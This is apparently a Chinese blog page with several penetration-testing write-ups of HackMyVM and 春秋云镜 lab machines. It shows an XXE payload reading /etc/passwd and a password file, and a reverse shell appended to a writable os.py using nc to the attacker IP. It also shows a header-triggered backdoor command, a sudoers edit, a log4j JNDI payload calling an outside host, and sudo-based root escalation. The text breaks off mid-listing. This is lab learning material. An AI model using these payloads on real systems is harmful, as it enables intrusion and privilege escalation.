<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129</span><br><span class="line">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.31.1    0a:00:27:00:00:11       (Unknown: locally administered)</span><br><span class="line">192.168.31.2    08:00:27:72:be:a6       PCS Systemtechnik GmbH</span><br><span class="line">192.168.31.141  08:00:27:27:28:54       PCS Systemtechnik GmbH</span><br></pre></td></tr></table></figure>

<p>192.168.31.141就是靶机ip</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# nmap 192.168.31.141</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-17 03:39 EDT</span><br><span class="line">Nmap scan report for 192.168.31.141</span><br><span class="line">Host is up (0.0029s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 08:00:27:27:28:54 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<h1 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h1><p>有一个登录的页面，通过查看请求头可以发现他是以xml的格式传输的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;details&gt;&lt;email&gt;123@123.com&lt;/email&gt;&lt;password&gt;123&lt;/password&gt;&lt;/details&gt;</span><br></pre></td></tr></table></figure>

<p>试一试xxe注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE test [ </span><br><span class="line">&lt;!ENTITY test1 SYSTEM &quot;file:///etc/passwd&quot;&gt; </span><br><span class="line">]&gt;&lt;details&gt;&lt;email&gt;$test1;&lt;/email&gt;&lt;password&gt;123&lt;/password&gt;&lt;/details&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;p align=&#x27;center&#x27;&gt; &lt;font color=white size=&#x27;5pt&#x27;&gt; root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:104:110::/nonexistent:/usr/sbin/nologin</span><br><span class="line">avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin</span><br><span class="line">sshd:x:106:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">david:x:1000:1000::/home/david:/bin/bash</span><br><span class="line"> is already registered! &lt;/font&gt; &lt;/p&gt;</span><br></pre></td></tr></table></figure>

<p>读取david用户的私钥尝试登录，但是会登录失败，通过fuzz可以知道/home/david还有一个.viminfo</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/quickhits.txt -u http://192.168.31.141/magic.php  -d &#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file:///home/david/FUZZ&quot;&gt; ]&gt; &lt;details&gt;&lt;email&gt;&amp;xxe;&lt;/email&gt;&lt;password&gt;das&lt;/password&gt;&lt;/details&gt;&#x27; --fw 11</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"> # This viminfo file was generated by Vim 8.2.</span><br><span class="line"># You may edit it if you&#x27;re careful!</span><br><span class="line"></span><br><span class="line"># Viminfo version</span><br><span class="line">|1,4</span><br><span class="line"></span><br><span class="line"># Value of &#x27;encoding&#x27; when this file was written</span><br><span class="line">*encoding=utf-8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># hlsearch on (H) or off (h):</span><br><span class="line">~h</span><br><span class="line"># Command Line History (newest to oldest):</span><br><span class="line">:wq!</span><br><span class="line">|2,0,1648909714,,&quot;wq!&quot;</span><br><span class="line"></span><br><span class="line"># Search String History (newest to oldest):</span><br><span class="line"></span><br><span class="line"># Expression History (newest to oldest):</span><br><span class="line"></span><br><span class="line"># Input Line History (newest to oldest):</span><br><span class="line"></span><br><span class="line"># Debug Line History (newest to oldest):</span><br><span class="line"></span><br><span class="line"># Registers:</span><br><span class="line"></span><br><span class="line"># Password file Created:</span><br><span class="line">&#x27;0  1  3  /usr/local/etc/mypass.txt</span><br><span class="line">|4,48,1,3,1648909714,&quot;/usr/local/etc/mypass.txt&quot;</span><br><span class="line"></span><br><span class="line"># History of marks within files (newest to oldest):</span><br><span class="line"></span><br><span class="line">&gt; /usr/local/etc/mypass.txt</span><br><span class="line">	*	1648909713	0</span><br><span class="line">	&quot;	1	3</span><br><span class="line">	^	1	4</span><br><span class="line">	.	1	3</span><br><span class="line">	+	1	3</span><br></pre></td></tr></table></figure>

<p>然后读取/usr/local/etc/mypass.txt文件</p>
<p>david的密码为<code>h4ck3rd4v!d </code></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>上传一个pspy64查看，发现每隔一段时间会运行一次suid.py文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2025/04/18 04:01:01 CMD: UID=0     PID=670    | /bin/sh -c /usr/bin/python3.9 /opt/suid.py</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#suid.py</span><br><span class="line">from os import system</span><br><span class="line">from pathlib import Path</span><br><span class="line"></span><br><span class="line"># Reading only first line</span><br><span class="line">try:</span><br><span class="line">    with open(&#x27;/home/david/cmd.txt&#x27;, &#x27;r&#x27;) as f:</span><br><span class="line">        read_only_first_line = f.readline()</span><br><span class="line">    # Write a new file</span><br><span class="line">    with open(&#x27;/tmp/suid.txt&#x27;, &#x27;w&#x27;) as f:</span><br><span class="line">        f.write(f&quot;&#123;read_only_first_line&#125;&quot;)</span><br><span class="line">    check = Path(&#x27;/tmp/suid.txt&#x27;)</span><br><span class="line">    if check:</span><br><span class="line">        print(&quot;File exists&quot;)</span><br><span class="line">        try:</span><br><span class="line">            os.system(&quot;chmod u+s /bin/bash&quot;)</span><br><span class="line">        except NameError:</span><br><span class="line">            print(&quot;Done&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;File not exists&quot;)</span><br><span class="line">except FileNotFoundError:</span><br><span class="line">    print(&quot;File not exists&quot;)</span><br></pre></td></tr></table></figure>

<p>这个脚本永远不会执行chmod，查看是否可以劫持</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import sys; print(sys.path)&#x27;</span><br><span class="line">[&#x27;&#x27;, &#x27;/usr/lib/python39.zip&#x27;, &#x27;/usr/lib/python3.9&#x27;, &#x27;/usr/lib/python3.9/lib-dynload&#x27;, &#x27;/usr/local/lib/python3.9/dist-packages&#x27;, &#x27;/usr/lib/python3/dist-packages&#x27;]</span><br><span class="line">david@system:/usr/lib/python3.9$ find ./ -writable 2&gt;/dev/null</span><br><span class="line">./os.py</span><br></pre></td></tr></table></figure>

<p>向os.py尾部添加</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import subprocess</span><br><span class="line">def shell():</span><br><span class="line">    import subprocess</span><br><span class="line">    subprocess.call(&quot;nc&quot; + &quot;192.168.31.129 9999 -e /bin/bash&quot;, shell=True)</span><br><span class="line">shell()</span><br></pre></td></tr></table></figure>

<p>然后监听一个端口静静等shell弹回来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://lvzhouhang.xyz/2025/04/17/Hackmyvm-Blackhat/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="lvzhouhang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="lvzhouhang">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/04/17/Hackmyvm-Blackhat/" class="post-title-link" itemprop="url">HackmyVM-Blackhat</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2025-04-17 12:14:42 / 修改时间：12:32:31" itemprop="dateCreated datePublished" datetime="2025-04-17T12:14:42+08:00">2025-04-17</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/HackMyVM/" itemprop="url" rel="index"><span itemprop="name">HackMyVM</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="fa fa-file-word-o"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>1.6k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="fa fa-clock-o"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>arp-scan -l扫描</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129</span><br><span class="line">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.31.1    0a:00:27:00:00:11       (Unknown: locally administered)</span><br><span class="line">192.168.31.2    08:00:27:73:b2:7a       PCS Systemtechnik GmbH</span><br><span class="line">192.168.31.140  08:00:27:19:a9:32       PCS Systemtechnik GmbH</span><br></pre></td></tr></table></figure>

<p>192.168.31.140是靶机地址</p>
<p>然后扫描端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# nmap 192.168.31.140</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-17 00:16 EDT</span><br><span class="line">Nmap scan report for 192.168.31.140</span><br><span class="line">Host is up (0.0019s latency).</span><br><span class="line">Not shown: 999 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 08:00:27:19:A9:32 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 6.85 seconds</span><br></pre></td></tr></table></figure>

<p>只开了一个80端口，扫描一下目录可以扫描到一个phpinfo.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Loaded Modules	core mod_so mod_watchdog http_core mod_log_config mod_logio mod_version mod_unixd mod_access_compat mod_alias mod_auth_basic mod_authn_core mod_authn_file mod_authz_core mod_authz_host mod_authz_user mod_autoindex mod_backdoor mod_deflate mod_dir mod_env mod_filter mod_mime prefork mod_negotiation mod_php7 mod_reqtimeout mod_setenvif mod_status</span><br></pre></td></tr></table></figure>

<p>mod_backdoor 存在漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# curl 192.168.31.140 -H &quot;Backdoor: id&quot;</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure>

<p>反弹一个shell出来，上传 linpeas.sh ，运行看结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">╔══════════╣ Files with ACLs (limited to 50)</span><br><span class="line">╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#acls</span><br><span class="line"># file: /etc/sudoers</span><br><span class="line">USER   root       r--</span><br><span class="line">user   darkdante  rw-</span><br><span class="line">GROUP  root       r--</span><br><span class="line">mask              rw-</span><br><span class="line">other             ---</span><br></pre></td></tr></table></figure>

<p>可以看到sudoers文件darkdante有写的权限，darkdante直接su就登录了哈哈哈哈哈</p>
<p>写入sudoers文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">darkdante ALL=(ALL:ALL) ALL</span><br></pre></td></tr></table></figure>

<p>然后sudo su，提权成功</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://lvzhouhang.xyz/2025/04/16/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Certify/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="lvzhouhang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="lvzhouhang">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/04/16/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Certify/" class="post-title-link" itemprop="url">春秋云镜-Certify</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-04-16 23:55:55" itemprop="dateCreated datePublished" datetime="2025-04-16T23:55:55+08:00">2025-04-16</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-04-17 13:22:02" itemprop="dateModified" datetime="2025-04-17T13:22:02+08:00">2025-04-17</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/" itemprop="url" rel="index"><span itemprop="name">春秋云镜</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="fa fa-file-word-o"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>23k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="fa fa-clock-o"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>21 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="FLAG1"><a href="#FLAG1" class="headerlink" title="FLAG1"></a>FLAG1</h1><p>先用fscan扫一扫</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# ../pentest/fscan/fscan2 -h 39.99.135.211</span><br><span class="line">┌──────────────────────────────────────────────┐</span><br><span class="line">│    ___                              _        │</span><br><span class="line">│   / _ \     ___  ___ _ __ __ _  ___| | __    │</span><br><span class="line">│  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    │</span><br><span class="line">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span><br><span class="line">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span><br><span class="line">└──────────────────────────────────────────────┘</span><br><span class="line">      Fscan Version: 2.0.0</span><br><span class="line"></span><br><span class="line">[2025-04-16 11:59:40] [INFO] 暴力破解线程数: 1</span><br><span class="line">[2025-04-16 11:59:40] [INFO] 开始信息扫描</span><br><span class="line">[2025-04-16 11:59:40] [INFO] 最终有效主机数量: 1</span><br><span class="line">[2025-04-16 11:59:41] [INFO] 开始主机扫描</span><br><span class="line">[2025-04-16 11:59:41] [INFO] 有效端口数量: 233</span><br><span class="line">[2025-04-16 11:59:41] [SUCCESS] 端口开放 39.99.135.211:22</span><br><span class="line">[2025-04-16 11:59:41] [SUCCESS] 端口开放 39.99.135.211:80</span><br><span class="line">[2025-04-16 11:59:41] [SUCCESS] 服务识别 39.99.135.211:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]</span><br><span class="line">[2025-04-16 11:59:45] [SUCCESS] 端口开放 39.99.135.211:8983</span><br><span class="line">[2025-04-16 11:59:46] [SUCCESS] 服务识别 39.99.135.211:80 =&gt; [http] 版本:1.18.0 产品:nginx 系统:Linux 信息:Ubuntu</span><br><span class="line">[2025-04-16 11:59:55] [SUCCESS] 服务识别 39.99.135.211:8983 =&gt; [http] 产品:Apache Solr Banner:[HTTP/1.1 302 Found.Location: http://172.22.9.19:8983/solr/.]</span><br><span class="line">[2025-04-16 11:59:55] [INFO] 存活端口数量: 3</span><br><span class="line">[2025-04-16 11:59:55] [INFO] 开始漏洞扫描</span><br><span class="line">[2025-04-16 11:59:55] [INFO] 加载的插件: ssh, webpoc, webtitle</span><br><span class="line">[2025-04-16 11:59:55] [SUCCESS] 网站标题 http://39.99.135.211      状态码:200 长度:612    标题:Welcome to nginx!</span><br><span class="line">[2025-04-16 11:59:56] [SUCCESS] 网站标题 http://39.99.135.211:8983 状态码:302 长度:0      标题:无标题 重定向地址: http://39.99.135.211:8983/solr/</span><br><span class="line">[2025-04-16 11:59:57] [SUCCESS] 网站标题 http://39.99.135.211:8983/solr/ 状态码:200 长度:16555  标题:Solr Admin</span><br><span class="line">[2025-04-16 12:00:04] [SUCCESS] 扫描已完成: 5/5</span><br></pre></td></tr></table></figure>

<p>39.99.135.211:8983是一个solr面板，存在log4j漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.99.135.211:8983/solr/admin/cores?action=$&#123;jndi:ldap://tc94uide908k5qcv0xurpcoorfx6lw9l.oastify.com&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Certify1.png"></p>
<p>上vps，可以利用<a target="_blank" rel="noopener" href="https://github.com/vulhub/java-chains">java-chains</a>反弹一个shell,反弹的shell如果不舒服可以写一个公钥进去</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">solr@ubuntu:/opt/solr$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries for solr on ubuntu:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User solr may run the following commands on ubuntu:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/gr</span><br></pre></td></tr></table></figure>

<p>提权<code>sudo grc --pty /bin/sh</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">solr@ubuntu:~$ sudo grc --pty /bin/sh</span><br><span class="line"># id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>

<p>提权到root后，写一个公钥进去，flag01在/root/flag下，然后上传一个fscan，再做一个代理</p>
<h1 id="FLAG2"><a href="#FLAG2" class="headerlink" title="FLAG2"></a>FLAG2</h1><p>查看一下内网的ip端，开扫！</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/tmp# ip a</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000</span><br><span class="line">    link/ether 00:16:3e:26:2b:c3 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.22.9.19/16 brd 172.22.255.255 scope global dynamic eth0</span><br><span class="line">       valid_lft 315357456sec preferred_lft 315357456sec</span><br><span class="line">    inet6 fe80::216:3eff:fe26:2bc3/64 scope link</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 